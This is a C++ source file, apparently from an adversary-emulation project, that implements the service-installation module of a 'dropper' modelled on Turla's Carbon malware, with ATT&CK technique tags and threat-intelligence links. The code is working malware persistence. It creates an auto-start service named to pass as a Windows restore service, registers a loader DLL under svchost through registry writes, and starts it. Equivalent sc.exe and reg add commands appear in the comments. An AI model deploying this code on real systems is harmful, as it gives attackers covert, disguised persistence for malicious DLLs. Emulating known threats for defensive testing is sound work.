/*
 * Handle service creation for the dropper.
 * 
 * References:
 *  https://docs.microsoft.com/en-us/windows/win32/services/starting-a-service
 *  https://docs.microsoft.com/en-us/windows/win32/services/svc-cpp
 *
 * CTI references:
 * [1] https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/
 * [2] https://www.ncsc.admin.ch/ncsc/en/home/dokumentation/berichte/fachberichte/technical-report_apt_case_ruag.html
 * [3] https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 */

#include <windows.h>
#include <errhandlingapi.h>
#include <winreg.h>
#include <winsvc.h>
#include <synchapi.h>
#include <iostream>
#include "service_handler.h"

namespace service_handler {

// Turla sets service details based on the name of the loader DLL [3]
const LPCTSTR kLoaderSvcName = TEXT("WinResSvc");
const LPCTSTR kLoaderSvcDisplayName = TEXT("WinSys Restore Service");
const LPCTSTR kSvcBinPath = TEXT("C:\\Windows\\System32\\svchost.exe -k WinSysRestoreGroup"); // We will use svchost to run our loader DLL.
const LPCTSTR kSvcParamSubKey = TEXT("SYSTEM\\CurrentControlSet\\services\\WinResSvc\\Parameters");
const LPCTSTR kSvchostSubKey = TEXT("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost");
const char* kSvchostGroupValueData = "WinResSvc\0"; // need extra null terminator for REG_MULTI_SZ format
const LPCTSTR kSvchostGroupName = TEXT("WinSysRestoreGroup");


// Wrapper for the CreateService function from winsvc.h
SC_HANDLE SvcCallWrapper::CreateServiceWrapper(
    SC_HANDLE       hSCManager,
    ServiceSettings *svcSettings
) {
    return CreateService(
        hSCManager,
        svcSettings->lpServiceName,
        svcSettings->lpDisplayName,
        svcSettings->dwDesiredAccess,
        svcSettings->dwServiceType,
        svcSettings->dwStartType,
        svcSettings->dwErrorControl,
        svcSettings->lpBinaryPathname,
        svcSettings->lpLoadOrderGroup,
        svcSettings->lpdwTagId,
        svcSettings->lpDependencies,
        svcSettings->lpServiceStartName,
        svcSettings->lpPassword
    );
}

// Wrapper for the OpenSCManager function from winsvc.h
SC_HANDLE SvcCallWrapper::OpenSCManagerWrapper(
    LPCTSTR     lpMachineName,
    LPCTSTR     lpDatabaseName,
    DWORD       dwDesiredAccess
) {
    return OpenSCManager(lpMachineName, lpDatabaseName, dwDesiredAccess);
}

// Wrapper for the CloseServiceHandle function from winsvc.h
BOOL SvcCallWrapper::CloseServiceHandleWrapper(SC_HANDLE hSCObject) {
    return CloseServiceHandle(hSCObject);
}

// Wrapper for the StartService function from winsvc.h
BOOL SvcCallWrapper::StartServiceWrapper(SC_HANDLE hService, DWORD dwNumServiceArgs, LPCTSTR *lpServiceArgVectors) {
    return StartService(hService, dwNumServiceArgs, lpServiceArgVectors);
}

// Wrapper for the OpenService function from winsvc.h
SC_HANDLE SvcCallWrapper::OpenServiceWrapper(SC_HANDLE hSCManager, LPCTSTR lpServiceName, DWORD dwDesiredAccess) {
    return OpenService(hSCManager, lpServiceName, dwDesiredAccess);
}

// Wrapper for the QueryServiceStatusEx function from winsvc.h
BOOL SvcCallWrapper::QueryServiceStatusExWrapper(
    SC_HANDLE               hService,
    SC_STATUS_TYPE          InfoLevel,
    SERVICE_STATUS_PROCESS* lpBuffer,
    DWORD                   cbBufSize,
    LPDWORD                 pcbBytesNeeded
) {
    return QueryServiceStatusEx(
        hService,
        InfoLevel,
        (LPBYTE) lpBuffer,
        cbBufSize,
        pcbBytesNeeded
    );
}

// Wrapper for RegCreateKeyEx from winreg.h
LSTATUS SvcCallWrapper::RegCreateKeyWrapper(
    HKEY                        hKey,
    LPCTSTR                     lpSubKey,
    DWORD                       Reserved,
    LPTSTR                      lpClass,
    DWORD                       dwOptions,
    REGSAM                      samDesired,
    const LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    PHKEY                       phkResult,
    LPDWORD                     lpdwDisposition
) {
    return RegCreateKeyEx(
        hKey,
        lpSubKey,
        Reserved,
        lpClass,
        dwOptions,
        samDesired,
        lpSecurityAttributes,
        phkResult,
        lpdwDisposition
    );
}

//Wrapper for RegSetKeyValue (winreg.h)
LSTATUS SvcCallWrapper::RegSetKeyValueWrapper(
    HKEY    hKey,
    LPCTSTR lpSubKey,
    LPCTSTR lpValueName,
    DWORD   dwType,
    LPCVOID lpData,
    DWORD   cbData
) {
    return RegSetKeyValue(
        hKey,
        lpSubKey,
        lpValueName,
        dwType,
        lpData,
        cbData
    );
}

// Wrapper for RegCloseKey (winreg.h)
LSTATUS SvcCallWrapper::RegCloseKeyWrapper(HKEY hKey) {
    return RegCloseKey(hKey);
}

// Wrapper for GetLastError (errhandlingapi.h)
DWORD SvcCallWrapper::GetLastErrorWrapper() {
    return GetLastError();
}

// Wrapper for Sleep (synchapi.h)
void SvcCallWrapper::SleepWrapper(DWORD dwMilliseconds) {
    Sleep(dwMilliseconds);
}

/*
 * CreateLoaderService:
 *      About:
 *          Install the loader service. This service will run the loader DLL.
 *      Result:
 *          Returns ERROR_SUCCESS on success, non-zero error code on failure.
 *      MITRE ATT&CK Techniques:
 *          T1569.002: System Services: Service Execution
 *          T1543.003: Create or Modify System Process: Windows Service
 *      CTI:
 *          https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 *      Other References:
 *          https://docs.microsoft.com/en-us/windows/win32/services/svc-cpp
 */
int CreateLoaderService(SvcCallWrapperInterface* svc_call_wrapper) {
    SC_HANDLE hSCManager;
    SC_HANDLE hService;
    
    // Get handle to SCM database
    hSCManager = svc_call_wrapper->OpenSCManagerWrapper( 
        NULL, // localhost
        NULL, // ServicesActive database 
        SC_MANAGER_ALL_ACCESS
    );
    if (hSCManager == NULL) {
        return FAIL_GET_SCM_HANDLE;
    }

    // Create the loader service
    // Equivalent sc command: sc.exe create WinResSvc binPath= "c:\windows\System32\svchost.exe -k WinSysRestoreGroup" type= share start= auto
    // Note that our service will run svchost.exe to run our DLL.
    ServiceSettings loaderSvcSettings = {
        kLoaderSvcName, // service name
        kLoaderSvcDisplayName, // service display name
        SERVICE_ALL_ACCESS,
        SERVICE_WIN32_SHARE_PROCESS, // our loader DLL expects to be run as this service type.
        SERVICE_AUTO_START,
        SERVICE_ERROR_NORMAL, // error control type 
        kSvcBinPath, // path to service binary (in this case, svchost.exe and associated args)
        NULL, // no load ordering group 
        NULL, // no tag identifier 
        NULL, // no dependencies 
        NULL, // LocalSystem account 
        NULL  // no password 
    };
    hService = svc_call_wrapper->CreateServiceWrapper( 
        hSCManager,
        &loaderSvcSettings
    );
    svc_call_wrapper->CloseServiceHandleWrapper(hSCManager);

    if (hService == NULL) {
        return FAIL_INSTALL_SVC;
    }

    svc_call_wrapper->CloseServiceHandleWrapper(hService);
    return ERROR_SUCCESS;
}

/*
 * SetServiceDllPath:
 *      About:
 *          Add a registry key value to tell the loader service where to pull the loader DLL from.
 *          Equivalent reg.exe command:
 *              reg add HKLM\SYSTEM\CurrentControlSet\services\WinResSvc\Parameters /v ServiceDll /t REG_EXPAND_SZ /d C:\path\to\loader\dll /f
 *      Result:
 *          Returns ERROR_SUCCESS on success, non-zero error code on failure.
 *      MITRE ATT&CK Techniques:
 *          T1569.002: System Services: Service Execution
 *          T1543.003: Create or Modify System Process: Windows Service
 *          T1112: Modify Registry
 *      CTI:
 *          https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 */
int SetServiceDllPath(SvcCallWrapperInterface* svc_call_wrapper, std::string dll_path) {
    // Open/create the registry key (create it if it doesn't exist yet)
    // Reference: https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa
    HKEY hKey;
    LSTATUS result = svc_call_wrapper->RegCreateKeyWrapper(
        HKEY_LOCAL_MACHINE,
        kSvcParamSubKey,
        0, // reserved
        NULL,
        REG_OPTION_NON_VOLATILE, // default storage option
        KEY_WRITE, // open with write access
        NULL,
        &hKey,
        NULL
    );
    
    if (result != ERROR_SUCCESS) {
        return FAIL_REG_CREATE_KEY_DLL_PATH;
    }
    
    // Set the DLL path in the reg key value/data pair
    // Reference: https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regsetkeyvaluea
    result = svc_call_wrapper->RegSetKeyValueWrapper(
        hKey,
        NULL, // writing to the exact key specified
        TEXT("ServiceDll"), // value name
        REG_EXPAND_SZ,
        dll_path.c_str(), // data is path to loader DLL.
        dll_path.size() + 1 // include null terminator
    );
    svc_call_wrapper->RegCloseKeyWrapper(hKey);
    
    if (result != ERROR_SUCCESS) {
        return FAIL_REG_SET_VAL_DLL_PATH;
    }
    return ERROR_SUCCESS;
}

/*
 * SetSvchostGroupValue:
 *      About:
 *          Add a registry key value to assign the loader service to the WinSysRestoreGroup Svchost group.
 *          The group name must match the name used in the service binpath when the loader service was created.
 *          Equivalent reg.exe command:
 *              reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /v WinSysRestoreGroup /t REG_MULTI_SZ /d "WinResSvc" /f
 *      Result:
 *          Returns ERROR_SUCCESS on success, non-zero error code on failure.
 *      MITRE ATT&CK Techniques:
 *          T1569.002: System Services: Service Execution
 *          T1543.003: Create or Modify System Process: Windows Service
 *          T1112: Modify Registry
 *      CTI:
 *          https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 */
int SetSvchostGroupValue(SvcCallWrapperInterface* svc_call_wrapper) {
    // Open/create the registry key (create it if it doesn't exist yet)
    // Reference: https://docs.microsoft.com/en-us/windows/win32/api/winreg/nf-winreg-regcreatekeyexa
    HKEY hKey;
    LSTATUS result = svc_call_wrapper->RegCreateKeyWrapper(
        HKEY_LOCAL_MACHINE,
        kSvchostSubKey,
        0, // reserved
        NULL,
        REG_OPTION_NON_VOLATILE, // default storage option
        KEY_WRITE, // open with write
        NULL,
        &hKey,
        NULL
    );
    
    if (result != ERROR_SUCCESS) {
        return FAIL_REG_CREATE_KEY_SVCHOST_GROUP;
    }
    
    // Set the service name in the reg key value/data pair
    result = svc_call_wrapper->RegSetKeyValueWrapper(
        hKey,
        NULL, // writing to the exact key specified
        kSvchostGroupName, // the value will be the svchost group name
        REG_MULTI_SZ, // svchost group values take REG_MULTI_SZ data types
        kSvchostGroupValueData, // specify the service name
        strlen(kSvchostGroupValueData) + 2 // include both null terminators
    );
    svc_call_wrapper->RegCloseKeyWrapper(hKey);
    
    if (result != ERROR_SUCCESS) {
        return FAIL_REG_SET_VAL_SVCHOST_GROUP;
    }
    return ERROR_SUCCESS;
}


// Helper function to get the current state for the given service. Returns ERROR_SUCCESS on success, otherwise an error code.
int GetServiceCurrentState(SvcCallWrapperInterface* svc_call_wrapper, SC_HANDLE hService, LPDWORD state_buffer) {
    SERVICE_STATUS_PROCESS service_status; 
    DWORD bytes_needed;
    
    if (!svc_call_wrapper->QueryServiceStatusExWrapper( 
        hService,
        SC_STATUS_PROCESS_INFO,
        &service_status,
        sizeof(SERVICE_STATUS_PROCESS),
        &bytes_needed))
    {
        return FAIL_QUERY_SERVICE_STATUS;
    }
    *state_buffer = service_status.dwCurrentState;
    return ERROR_SUCCESS;
}

/*
 * StartLoaderService:
 *      About:
 *          Start the loader service.
 *      Result:
 *          Returns ERROR_SUCCESS on success, non-zero error code on failure.
 *      MITRE ATT&CK Techniques:
 *          T1569.002: System Services: Service Execution
 *          T1543.003: Create or Modify System Process: Windows Service
 *      CTI:
 *          https://www.gdata.pt/blog/2015/01/23926-analysis-of-project-cobra
 *      Other References:
 *          https://docs.microsoft.com/en-us/windows/win32/services/svccontrol-cpp
 */
int StartLoaderService(SvcCallWrapperInterface* svc_call_wrapper) {
    SC_HANDLE hSCManager;
    SC_HANDLE hService;
    DWORD current_state;

    // Get handle to SCM database
    // Get handle to SCM database
    hSCManager = svc_call_wrapper->OpenSCManagerWrapper( 
        NULL, // localhost
        NULL, // ServicesActive database 
        SC_MANAGER_ALL_ACCESS
    );
    if (hSCManager == NULL) {
        return FAIL_GET_SCM_HANDLE;
    }

    // Get service handle
    hService = svc_call_wrapper->OpenServiceWrapper( 
        hSCManager,
        kLoaderSvcName,
        SERVICE_ALL_ACCESS
    );
 
    if (hService == NULL) { 
        svc_call_wrapper->CloseServiceHandleWrapper(hSCManager);
        return FAIL_OPEN_SERVICE;
    }    

    // If service is already running, just return
    int result = GetServiceCurrentState(svc_call_wrapper, hService, &current_state);
    if (result != ERROR_SUCCESS) {
        svc_call_wrapper->CloseServiceHandleWrapper(hSCManager);
        svc_call_wrapper->CloseServiceHandleWrapper(hService);
        return result;
    }
    if (current_state != SERVICE_STOPPED && current_state != SERVICE_STOP_PENDING) {
        svc_call_wrapper->CloseServiceHandleWrapper(hSCManager);
        svc_call_wrapper->CloseServiceHandleWrapper(hService);
        return ERROR_SUCCESS;
    }

    // Attempt to start service
    if (!svc_call_wrapper->StartServiceWrapper(
        hService,  // handle to service 
        0,         // number of arguments 
        NULL))     // no arguments 
    {
        svc_call_wrapper->CloseServiceHandleWrapper(hSCManager); 
        svc_call_wrapper->CloseServiceHandleWrapper(hService);
        return FAIL_START_SERVICE; 
    }

    // Wait until service is no longer start-pending. Wait 2 seconds at a time for a maximum of 3 tries.
    int max_wait_tries = 3;
    int curr_wait_try = 0;
    int wait_time_ms = 2000;
    result = GetServiceCurrentState(svc_call_wrapper, hService, &current_state);
    if (result != ERROR_SUCCESS) {
        svc_call_wrapper->CloseServiceHandleWrapper(hSCManager);
        svc_call_wrapper->CloseServiceHandleWrapper(hService);
        return result;
    }
    while (current_state == SERVICE_START_PENDING && curr_wait_try < max_wait_tries) {
        svc_call_wrapper->SleepWrapper(wait_time_ms);
        result = GetServiceCurrentState(svc_call_wrapper, hService, &current_state);
        if (result != ERROR_SUCCESS) {
            svc_call_wrapper->CloseServiceHandleWrapper(hSCManager);
            svc_call_wrapper->CloseServiceHandleWrapper(hService);
            return result;
        }
        curr_wait_try += 1;
    }
    
    svc_call_wrapper->CloseServiceHandleWrapper(hSCManager);
    svc_call_wrapper->CloseServiceHandleWrapper(hService);

    // Make sure service is actually running
    return current_state == SERVICE_RUNNING ? ERROR_SUCCESS : FAIL_SERVICE_DID_NOT_START_IN_TIME;
}

} // namespace service_handler
